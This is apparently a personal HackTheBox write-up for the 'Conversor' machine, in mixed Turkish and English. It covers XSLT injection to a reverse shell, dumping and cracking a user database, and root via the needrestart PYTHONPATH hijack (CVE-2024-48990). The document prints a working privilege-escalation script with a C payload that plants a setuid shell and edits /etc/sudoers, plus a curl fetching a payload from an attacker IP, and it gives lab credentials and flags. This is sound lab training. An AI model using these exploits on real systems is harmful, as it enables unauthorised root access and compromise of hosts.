
# Linux Conversor

# IP=`10.10.11.92`


-------------------------------------------------------------------------------------------------

# Enum

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)

```


## ports = 22,80

-------------------------------------------------------------------------------------------------

# web 80
XML > XSLT (Extensible Stylesheet Language Transformations) yapan bir site
XSLT: XML or other formats like HTML, SVG, SVG, plain text, etc… gibi dosyalara çevirir
XSLT Injections adlı bir zafiyet varmış bunu araştır.
> https://ine.com/blog/xslt-injections-for-dummies

şunlar olabilir:
* RCE
* Local File Read (via error messages)
* XXE
* SSRF and Port Scans

## Individuals
```
FisMatHack`:Backend Developer

Arturo Vidal:Frontend & UX

David Ramos:Team Lead
```

## mail
`contact@conversor.htb`

## OPTIONS methodu

# source code

## templates > index.html
```html
<a href="{{ url_for('view_file', file_id=f['id']) }}" target="_blank">{{ f['filename'] }}</a>
```

## Flask secret
```python
app = Flask(__name__)
app.secret_key = 'Changemeplease'
```


## reverse shell buldum
https://github.com/ex-cal1bur/XSLT-Injection_reverse-shell


-------------------------------------------------------------------------------------------------

# Initial Access - www-data

```bash
www-data@conversor:~$ find .
find .
.
./.python_history
./.gnupg
./.gnupg/S.gpg-agent.browser
./.gnupg/private-keys-v1.d
./.gnupg/S.gpg-agent.ssh
./.gnupg/S.gpg-agent.extra
./.gnupg/S.gpg-agent
./.gnupg/trustdb.gpg
./.gnupg/pubring.kbx
./.sqlite_history
./.bash_history
./conversor.htb
./conversor.htb/scripts
./conversor.htb/scripts/cleanup_uploads.py
./conversor.htb/scripts/malwa.py
./conversor.htb/static
./conversor.htb/static/images
./conversor.htb/static/images/david.png
./conversor.htb/static/images/fismathack.png
./conversor.htb/static/images/arturo.png
./conversor.htb/static/nmap.xslt
./conversor.htb/static/source_code.tar.gz
./conversor.htb/static/style.css
./conversor.htb/uploads
./conversor.htb/uploads/nmap.xml
./conversor.htb/uploads/exp2.xml
./conversor.htb/uploads/shell.xslt
./conversor.htb/uploads/malicious.xslt
./conversor.htb/uploads/caller.xml
./conversor.htb/uploads/f
./conversor.htb/uploads/959f997a-f232-48a7-ba01-c484bd61ddef.html
./conversor.htb/uploads/47bd35db-aac2-40ae-9335-dae35a3d9882.html
./conversor.htb/uploads/exp.php
./conversor.htb/uploads/fc5b1353-1c0c-4184-9844-36639766515e.html
./conversor.htb/uploads/u
./conversor.htb/linpeas.sh
./conversor.htb/app.py
./conversor.htb/instance
./conversor.htb/instance/users.db
./conversor.htb/templates
./conversor.htb/templates/register.html
./conversor.htb/templates/about.html
./conversor.htb/templates/index.html
./conversor.htb/templates/login.html
./conversor.htb/templates/base.html
./conversor.htb/templates/result.html
./conversor.htb/__pycache__
./conversor.htb/__pycache__/app.cpython-310.pyc
./conversor.htb/app.wsgi
```

## users.db
kendime nc ile attım
```bash
sqlite> SELECT * FROM users
   ...> ;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|mm|202cb962ac59075b964b07152d234b70
6|test|098f6bcd4621d373cade4e832627b4f6
7|test123|e10adc3949ba59abbe56e057f20f883e
8|a|0cc175b9c0f1b6a831c399e269772661
9|admin|21232f297a57a5a743894a0e4a801fc3
10|123123|4297f44b13955235245b2497399d7a93
11|fuck|99754106633f94d350db34d548d6091a
12|aaaa|08f8e0260c64418510cefb2b06eee5cd
```

fismathack denilen adam box'ta user olarak da var.

5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
## SSH CRED: `fismathack:Keepmesafeandwarm`

-------------------------------------------------------------------------------------------------

# fismathack

## user.txt: `4010368a7e28824fb78941796375adb7`

## runner.sh
bu ne?
```bash
fismathack@conversor:~$ cat runner.sh 
#!/bin/bash
set -e
cd /tmp

# 1. Create the malicious module directory structure
mkdir -p malicious/importlib

# 2. Download our compiled C payload from our attacker server
#    (Replace 10.10.14.81 with your attacker IP)
curl [http://10.10.17.148:8000/__init__.so](http://10.10.17.148:8000/__init__.so) -o /tmp/malicious/importlib/__init__.so

# 3. Create the "bait" Python script (e.py)
#    This script just loops, waiting for the exploit to work
cat <<< 'EOF' > /tmp/malicious/e.py
import time
import os

while True:
    try:
        import importlib
    except:
        pass
    
    # When our C payload runs, it creates /tmp/poc
    # This loop waits for that file to exist
    if os.path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        # The C payload also added a sudoers rule.
        # We use that rule to pop our root shell.
        os.system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

# 4. This is the magic!
#    Run the bait script (e.py) with the PYTHONPATH hijacked.
#    This process will just sit here, waiting for needrestart to scan it.
echo "Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell."
cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null

```
> runner.sh PYTHONPATH hijack + compiled C extension (.so) taktiğini kullanıyor;

## sudo -l
```bash
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```
`needrestart` : devasa bir perl dosyası :( nasıl analiz edicem? google'a yazdım

## needrestart LPE
> https://ubuntu.com/blog/needrestart-local-privilege-escalation
> https://github.com/ten-ops/CVE-2024-48990_needrestart/tree/main : karşıda make olmadığı içim çalışmıyor.
> https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing : gcc yok ! yaaaa!

kafam durduÇ MOLA


burdaki tüm adımlari local makinede yapıp victime aktarıdm.
```sh
#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib

# Create and compile the malicious library
cat << 'EOF' > /tmp/malicious/lib.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a() {
    if(geteuid() == 0) {  // Only execute if we're running with root privileges
        setuid(0);
        setgid(0);
        const char *shell = "cp /bin/sh /tmp/poc; "
                            "chmod u+s /tmp/poc; "
                            "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
                            "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";
        system(shell);
    }
}
EOF

gcc -shared -fPIC -o "/tmp/malicious/importlib/__init__.so" /tmp/malicious/lib.c

# Minimal Python script to trigger import
cat << 'EOF' > /tmp/malicious/e.py
import time
while True:
    try:
        import importlib
    except:
        pass
    if __import__("os").path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        __import__("os").system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF

cd /tmp/malicious; clear;echo -e "\n\nWaiting for norestart execution...\nEnsure you remove yourself from sudoers on the poc file after\nsudo sed -i '/ALL ALL=NOPASSWD: \/tmp\/poc/d' /etc/sudoers\nAs well as remove excess files created:\nrm -rf malicious/ poc"; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```


## sürekli olmuyor. Teknik:
sanırım aynı makineye onlarca kişi privesc yaptığı için çakışıyor.
bu nedenle tüm işlemleri bir script haline getirip bir anda yapmak privesc ihtimalini arttır.

script bizim makineden derlenmiş so dosyasını çekip kalan işleri kendisi yapmalı.

## mediumdan kopyalarken:
* tırnaklar! dikkat et.

# root.txt = `aaf9a768b63147818c23441e8d3f8ee8`
sayısız saçma sapan hata yaptım privesc'de ama: diğer makinelerde yapmıcam!

-------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------------